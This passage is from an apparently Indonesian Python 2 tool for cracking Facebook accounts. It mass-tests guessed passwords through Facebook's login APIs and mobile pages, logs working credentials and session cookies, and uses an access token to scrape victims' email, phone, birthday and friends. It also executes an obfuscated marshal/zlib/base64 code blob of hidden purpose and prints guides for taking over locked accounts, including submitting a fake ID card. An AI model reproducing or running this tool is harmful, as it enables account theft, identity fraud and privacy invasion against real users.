        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()


def ___jeeck___sayang___almira___inpocook___(lalalalaganigani):
    try:
        user = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan Id : ")
        if user == '':
            jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan dengan benar bro");___jeeck___sayang___almira___inpocook___(lalalalaganigani)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, lalalalaganigani)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(B,P)
#    print '\033[0;36m✠═════════════════════════════════════════════════════✠\n';time.sleep(0.03)
    print ' %s[%s+%s]'%(B,P,B), 52 * '\x1b[1;96m=\x1b[0m'
    print '  (•) informasi akun Facebook (•)';time.sleep(0.03)
    print '\n \033[0;36m[ >_ ] nama lengkap : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(B,P)
    print ' [ >_ ] nama depan   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(B,P)
    print ' [ >_ ] nama belakang: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(B,P)
    print ' [ >_ ] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	___xxz___jeeck___ = x['id']
    except (KeyError, IOError):
    	___xxz___jeeck___ = '%s?%s'%(B,P)
    print ' [ >_ ] id facebook  : %s'%(___xxz___jeeck___);time.sleep(0.03)
    print ' %s[%s+%s]'%(B,P,B), 52 * '\x1b[1;96m=\x1b[0m'
    print '\n  (•) data-data akun facebook (•)\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(B,P)
    print ' [ >_ ] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(B,P)
    print ' [ >_ ] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(B,P)
        day = '%s-%s'%(B,P)
        year = '%s-%s'%(B,P)
    print ' [ >_ ] tanggal lahir : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Perempuan").replace("male", "Laki-laki")
    except (KeyError, IOError):
    	jenis = ''
    print ' [ >_ ] jenis kelamin  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, lalalalaganigani))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print ' [ >_ ] Total pertemanan  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, lalalalaganigani))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(B,P)
    print ' [ >_ ] Total pengikut : %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(B,P)
    print ' [ >_ ] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(B,P)
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(B,P)
    except: pass
    print ' [ >_ ] status hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(B,P)
    except: pass
    print ' [ >_ ] tentang status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(B,P)
    except: pass
    print ' [ >_ ] kota asal      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(B,P)
    except: pass
    print ' [ >_ ] tinggal di     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(B,P)
    except: pass
    print ' [ >_ ] zona waktu     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(B,P)
        month = '%s-%s'%(B,P)
        day = '%s-%s'%(B,P)
    except:pass
    
    print ' %s[%s+%s]'%(B,P,B), 52 * '\x1b[1;96m=\x1b[0m'
    raw_input('\n  [ %sENTER%s ] '%(P,B));___jeeck___xnano___xxz___()




def ___jeeck___sayang___almira___inpocookkkk___():
    
    jeeck_love_almira("\n %s[%s•%s] AUTHOR :  "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]          (1. Sanz-Tzy "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s] TEAM PROJECT :  "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]              (1. XNXCODE"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]              (2. XXCODE "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]              (3. YAYAN XD "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]              (4. YUMASAA "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]              (5. RISKY"%(P,B,P))
    jeeck_love_almira(" [•] THANKS TO : ")
    jeeck_love_almira(" %s[%s•%s]           : XNXCODE"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : XXCODE"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : RISKY / DUMAII"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : YAYAN XD"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : YUMASAA"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : UDARA KARENA TANPA UDARA KITA AKAN MATI"%(P,B,P))
    jeeck_love_almira(" [•] GITHUB KAWAN  : ")
    jeeck_love_almira(" %s[%s•%s]           : YAYAN XD "%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           ( https://github.com/Yayan-XD"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : RISKY / DUMAII"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           ( https://github.com/Dumai-991"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           : YUMASAA"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           ( https://github.com/YumasaaTzy"%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           ("%(P,B,P))
    jeeck_love_almira(" %s[%s•%s]           NGGAK DI FOLLOW PECAH PALA KAU :V"%(P,B,P))
    raw_input('\n  [ %sENTER%s ] '%(P,B));___jeeck___xnano___xxz___()

def ___jeeck___bukaksesi___():
  print(" APN SESI S7I");time.sleep(0.03)

  print("NAMA : KEDIPP YO?");time.sleep(0.03)
  print("APN : telstra.internet");time.sleep(0.03)
  print("PROXY : 135.148.41.253");time.sleep(0.03)
  print("PENGGUNA : guest ");time.sleep(0.03)
  print("SANdi :guest");time.sleep(0.03)
  print("MMSC : http://mms-s:8080/mmsc");time.sleep(0.03)
  print("PORT MMS : 8080");time.sleep(0.03)
  print("JENIS APN : default,MMS,supl");time.sleep(0.03)

  print("[•] menu utp");time.sleep(0.03)
  print(" *TUTOR UBAH OPSI UTP ");time.sleep(0.03)

  print("1 : LU LOGIN DI FB LITE PAKEK WIFI ");time.sleep(0.03)
  print("2 : CEK OPSI NYA ");time.sleep(0.03)
  print("3 : KALO OPSI UTP? LU LOG UT, TRUS GANTI JARINGAN ");time.sleep(0.03)
  print("4 : PAKEK APN, TRUS LOGIN KE FB LITE.");time.sleep(0.03)
  print("5 : KALO BELUM KE UBAH?, GANTI, LOGIN PAKEK APK CROME");time.sleep(0.03)
  print("6 : LU LOGIN KE CROME MENGGUNAKAN JARINGAN + APN ");time.sleep(0.03)
  print("7 : LU LOGIN, CEK OPSI");time.sleep(0.03)
  print("8 : KALO OPSI MASIH SAMA, LU TARIK DARI ATAS KE BAWA ");time.sleep(0.03)
  print("9 : BOOOM, ");time.sleep(0.03)
  print("10 : KE UBAH? SETOR👍");time.sleep(0.03)


  print("*NOTE : TUTOR TIDAK DI JUAL BELIKAN*");time.sleep(0.03)
  print(" _*SESI IDENT FOTO TEMAN*_");time.sleep(0.03)

  print("1. Buka Fb Lite Yang Kesesi");time.sleep(0.03)
  print("2. 2. Buka Fb Ori");time.sleep(0.03)
  print("3. 3. masuk ke fb sesi,lalu klik ident foto teman");time.sleep(0.03)
  print("4. 4. Masuk ke fb ori Dan search Fb sesi");time.sleep(0.03)
  print("5. 5. Masuk ke Daftar teman");time.sleep(0.03)
  print("6. 6. Search 1/1 Ke daftar Teman yg ada di sesi itu");time.sleep(0.03)
  print("7. 7. Lalu Cocokan");time.sleep(0.03)
  print("8. 8. Jebol");time.sleep(0.03)
  print("9. 9. DONE");time.sleep(0.03)

  print("_*SESI TTL*_");time.sleep(0.03)

  print("1. Buka fb Kesesi Di Fb Ori/Manapun");time.sleep(0.03)
  print("2. 2. Pakai Akun Yang gk ke sesi");time.sleep(0.03)
  print("3. 3. Apdd Semua Teman / Yg Like Foto Akun Yg Ke Sesi");time.sleep(0.03)
  print("4. 4. Tunggu Di Acc");time.sleep(0.03)
  print("5. 5. Kalo Udah Di Acc Klik Selengkapnya Di Propile");time.sleep(0.03)
  print("6. 6. Ad Ttl");time.sleep(0.03)
  print("7. 7. Isi TtlnyanDi Fb Yg Ke Sesi");time.sleep(0.03)
  print("8. 8. DONE");time.sleep(0.03)

  print("_*SESI UNGGAH TANDA PENGENAL*_");time.sleep(0.03)

  print("1. Uplode Salah Satu Tanda Pengenal Wajib Sama Informasinya Kalo Mau Jebol");time.sleep(0.03)
  print("2. 2. Klo Belom Mempunyai Tanda Pengenal Bisa Uplode Ktp Fake Buat Ubah Opsi");time.sleep(0.03)
  print("3. 3. Lalu klik Unggah Foto Trus Pilih Foto Yang Sudah di siap kan");time.sleep(0.03)
  print("4. 4. Lalu Masukan Email mu Truss Klik Hanya Saya Yang Tau");time.sleep(0.03)
  print("5. 5.Tunggu 24 jam Kalo Ad Tanda Pengenal");time.sleep(0.03)
  print("6. 6. Done Jebol");time.sleep(0.03)
  print("7. 7. Kalo Ubah Opsi Tunggu 3 Hari Jangan Login");time.sleep(0.03)
  print("8. 8. Biasanya Ke Ubah Ke Ttl / Kode Email / Telpon");time.sleep(0.03)
  print("9. 9. Tinggal Jebolkan");time.sleep(0.03)
  raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___jeeck___xnano___xxz___()

def seting_jeeckxxz():
    print '\n %s(%s1%s)%s ganti user agent'%(P,B,P,B)
    print ' %s(%s2%s)%s check user agent'%(P,B,P,B)
    ___janganlupafollowyaasu___ = raw_input('\n %s[%s?%s] choose : '%(P,B,P))
    if ___janganlupafollowyaasu___ == '':
        print '\n %s[%s×%s] Gak boleh kosong anjink'%(P,B,P);time.sleep(2);seting_jeeckxxz()
    elif ___janganlupafollowyaasu___ in['1','01']:
        _jeeck_ganteng_almira_yangpunya_()
    elif ___janganlupafollowyaasu___ in['2','02']:
        try:
            user_agent = open('jeeckxxz.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] User Agent anda : %s%s'%(P,B,P,H,user_agent)
        raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___jeeck___xnano___xxz___()
    else:
        print '\n %s[%s×%s] input yang bener'%(P,B,P);time.sleep(2);seting_jeeckxxz()

_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVltz20QUPvLdzq0ptE5Dm5pCMuYllizr4gwhTYHOUIZ0xnkAPMx4ZO1Glm1pjXYFDVOe4CfyzC/gR3B27dBGTTx0rLXOt/udi/as1nvkw+Iq4P0Ub/4XCgLQR6lBX4MAFj+Sg4sC/FSAfg76eehjpwi0BOMykDyQApAiBHn4A70qEK4DKQEpg00qQKoINSBrCMhvIGwC2UK4A2Qb4S6QDxA+BHIP4T6QOsIOkAcIu0A+QngI5BHY/aqaVU3JNSXXldxQclPJLSUx9B78iYlsA3kM59VmAxMTWygMXdfNtuU4Ztc2u5biLMfsWI6lO7prdrpGKJeES48fvThozBgXISJL5Ci+9BqBFwsaB0ef8V00Oo3HYSKuyMYQraho/EpHI/4Y1c/oqOF7yX9ejSCMvNhTdo2jpiijzQsvTr0kFDns64aoIDynw+QN1xZFhO+8hIo5YSridJaE0znREXlpQRcOlpDv9EUaL8b2YjxdjB313NMg5QJ/inJFFeGczgSNhjSZk11l93Ii2BVl6Gp+Z+yXN2bGfM5fUf4W1/Y1BNmVU/1Sruk/yFz+rb0G+F0DATDW5Nt6rcF93DjagshliXyWKGSJYpYoZYlylqhkiaok6m8RNcA86rhv6xnFeta1plxvsNzIWm6CUNlc5K7RWyBUTlKTz2qKt2pKcoY3asq3aiq3aqq3amq3atYymu/jMmiaFmvwAx4j5807cqfw5yhHQsz4UasVJN5sdHjh+XTI2OTQZ1Er85ds8XTI/STEjcRPPN+nnA8Em9D4eJ//n1C2aXd10zLNjr5qKN21HdfoGF3HWTmU5TquZZiOvnKCOqbWNtqOrndXDdUxTNc127plrzgrt93uurhMlm3qK6+VYeqm0bEtx7aXhvp2eajMsd6ahhPKT3gaRV5yeSySlB5ci8iP3y8echGNBW+dRBjEC+gx38QImaBPlwd1cd93u8bqu6LtWJaLl+Eu3/bfLA8V0dZFEtKYcMxKjBg5lvXvIA0JR++DbLRny6Pt8xtW6d0wzXVZnmUJSejPKeWCq3Iln6zqz4hR4cUTVeImbIQHEsCUDbDQxoIR5YjDMaX+ROlehYNxGM3C+JUqk6gLgiurmGJTUXHAU56qsod9n06xPOOhqkZDFjRl7RLyCJt684YlPJS3uCcnQuPBYP5QRKR/Q2jKbwcl+B6KFidY+0nr7GtsrbntkInBhEWHs0uxgSbXyLvSsSPdtbxW0rbfaQ8Wd13blS23O0dtD+3PmtK990gK9b0j588mCvyZgpCohZ0yNlOJ4icNYZHq+iMW+rT3UDrKFRmmUy8eCDHtyUR68lOm97EUT6T4RIpPpdiXonmV9fvlL1/J5xEj6ZR+IefAd1CUMPE9bUfra6Vr7V84qpQn', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()

def _jeeck_ganteng_almira_yangpunya_():
    os.system('rm -rf jeeckxxz.txt')
    ____xxz___jeeck____ = raw_input('\n [%s?%s] %singin menggunakan user agent hp anda [Y/t]: '%(P,B,P))
    if ____xxz___jeeck____ == '':
        print '\n %s[%s×%s] Gak boleh kosong anjink'%(P,B,P);_jeeck_ganteng_almira_yangpunya_()
    elif ____xxz___jeeck____ in['Y','y']:
        jeeck_love_almira('\n %s[+]%s anda akan di arakan ke situs web setelah di arahkan ke situs web. \n%s [+]%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(P,B,P,B,H,N));time.sleep(1);os.system('xdg-open https://myuseragent.herokuapp.com')
        _jeeck_xxzzyzzzz_almiradonk_ = raw_input(' [%s+%s] Masukan user agent hp anda :%s '%(P,B,H))
        open('jeeckxxz.txt', 'w').write(_jeeck_xxzzyzzzz_almiradonk_);time.sleep(2)
        jeeck_love_almira('\n %s[%s+%s] berhasil menggunakan user agent hp anda...'%(P,B,P))
        raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___jeeck___xnano___xxz___()
    elif ____xxz___jeeck____ in['T','t']:
        _jeeck_xxzzyzzzz_almiradonk_ = raw_input(' [%s?%s] Masukan user agent :%s '%(P,B,H))
        open('jeeckxxz.txt', 'w').write(_jeeck_xxzzyzzzz_almiradonk_);time.sleep(2)
        jeeck_love_almira('\n %s[%s+%s] berhasil mengganti user agent...'%(P,B,P))
        raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___jeeck___xnano___xxz___()
    else:
        print '\n %s[%s!%s] Y/t anjink'%(P,B,P);_jeeck_ganteng_almira_yangpunya_()

class ___jeeck___run___:

    def __init__(self):
        self.id = []

    def ___almira___cans___(self):
        try:
            self.apk = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan File : ")
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(B,P,B,len(self.id),N)
        except:
            print '\n %s[%s+%s] file [%s%s%s] Makanya Dump dahulu cook '%(B,P,B,P,self.apk,N);time.sleep(3)
            raw_input( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()
        ___JeckoloveAlmira___ = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Sandi otomatis / manual [ O/m ] : ")
        if ___JeckoloveAlmira___ in ('m', 'M'):
            jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Example pass : jeeckgantenk/anjink/sayangku/freefire/")
            while True:
                ___passxnxx___ = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pass : ")
                print ' [ >_ ] Cracking dengan sandi -> [ %s%s%s ]' % (M, ___passxnxx___, N)
                if ___passxnxx___ == '':
                    jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Harap masukan dengan benar")
                elif len(___passxnxx___)<=5:
                    jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxsimum id 6 karakter ya cook")
                else:
                    def _____jeeck_____(jeckoc=None):
                        ___jeeck___sayang___almira___ = raw_input ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack : ")
                        if ___jeeck___sayang___almira___ == '':
                            jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Di omongi ojo salah sengetik goblok");_____jeeck_____()()
                        elif ___jeeck___sayang___almira___ == '1':
                            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print '\n [%s!%s] %sOn of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B,P)
                            with JeckoloveAlmira(max_workers=30) as (___jeeck___xxzy___):
                                for ___almira___ in self.id:
                                    try:
                                        ___love___ = ___almira___.split('<=>')[0]
                                        ___jeeck___xxzy___.submit(self.__jeeck__api__, ___love___, jeckoc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif ___jeeck___sayang___almira___ == '2':
                            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print '\n [%s!%s] %sOn of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B,P)
                            with JeckoloveAlmira(max_workers=30) as (___jeeck___xxzy___):
                                for ___almira___ in self.id:
                                    try:
                                        ___love___ = ___almira___.split('<=>')[0]
                                        ___jeeck___xxzy___.submit(self.__yayangantenk__, ___love___, jeckoc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif ___jeeck___sayang___almira___ == '3':
                            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print '\n [%s!%s] %sOn of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B,P) 
                          
                            with JeckoloveAlmira(max_workers=30) as (___jeeck___xxzy___):
                                for ___almira___ in self.id:
                                    try:
                                        ___love___ = ___almira___.split('<=>')[0]
                                        ___jeeck___xxzy___.submit(self.__mfb,__, ___love___, jeckoc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s+%s] Wronk Input'%(P,B,P);_____jeeck_____()
#                    print '\n [ pilih method login - silalmirakan coba satu² ]\n'
                    print ' %s[%s+%s] %s Menu Crack\n'%(B,P,B,P)
                    print ' %s[%s1%s] %smethod B-Api(sellow)'%(B,P,B,P)
                    print ' %s[%s2%s] %smethod Mbasic (sellow)'%(B,P,B,P)
                    print ' %s[%s3%s] %smethod Mobile (sellow)'%(B,P,B,P)
                    _____jeeck_____(___passxnxx___.split(','))
                    break
        elif ___JeckoloveAlmira___ in ('o', 'O'):
#            print '\n [ pilih method login - silalmirakan coba satu² ]\n'
            print ' %s[%s+%s] %s Menu Crack\n'%(B,P,B,P)
            print ' %s[%s1%s] %smethod API (fast)'%(B,P,B,P)
            print ' %s[%s2%s] %smethod Mbasic (sellow)'%(B,P,B,P)
            print ' %s[%s3%s] %smethod Mobile (sellow)'%(B,P,B,P)
            self._jeeckgantenggaksenenggakusahrecode_()
        else:
            print '\n %s[%s+%s] pilih [ O/m ] TOLOL goblok!'%(P,B,P);self.___almira___cans___()
        return

    def __jeeck__api__(self, user, _____jeeck_____):
        global ok,cp,loop
#        sys.stdout.write('\r %s[%s+%s] %s[Cracking] %s/%s /\_/-> OK-:%s /\_/-> CP-:%s '%(B,P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.write('\r [%s*%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(P,B,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _____jeeck_____:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_ganiganiganihujanbadaianginribut = open('jeeckxxz.txt', 'r').read()
            except (KeyError, IOError):
            	_ganiganiganihujanbadaianginribut = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _ganiganiganihujanbadaianginribut, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s+%s] IP terblokir hidupkan mode pesawat 5 detik'%(P,B,P)),
                sys.stdout.flush()
                loop +=1
                self.__jeeck__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s[+---> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' (s) %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    lalalalaganigani = open('.almiraXjeeck.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,lalalalaganigani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s[+---> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' (c) %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s[+---> %s|%s                %s' % (K,user,pw,N)
                wrt = ' (c) %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __yayangantenk__(self, user, _____jeeck_____):
        global ok,cp,loop
        #sys.stdout.write('\r %s[%s+%s]%s [Cracking] %s/%s /\_/-> OK-:%s /\_/-> CP-:%s '%(B,P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.write('\r [%s*%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(P,B,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _____jeeck_____:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_ganiganiganihujanbadaianginribut = open('jeeckxxz.txt', 'r').read()
            except (KeyError, IOError):
            	_ganiganiganihujanbadaianginribut = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_ganiganiganihujanbadaianginribut,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s[+---> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' (s) %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    lalalalaganigani = open('.almiraXjeeck.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,lalalalaganigani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s[+---> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' (c) %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s[+---> %s|%s                %s' % (K,user,pw,N)
                wrt = ' (c) %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __riskygantenk__(self, user, _____jeeck_____):
        global ok,cp,loop
        #sys.stdout.write('\r %s[%s+%s]%s [Cracking] %s/%s /\_/-> OK-:%s /\_/-> CP-:%s '%(B,P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.write('\r [%s*%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(P,B,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _____jeeck_____:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_ganiganiganihujanbadaianginribut = open('jeeckxxz.txt', 'r').read()
            except (KeyError, IOError):
            	_ganiganiganihujanbadaianginribut = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_ganiganiganihujanbadaianginribut,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
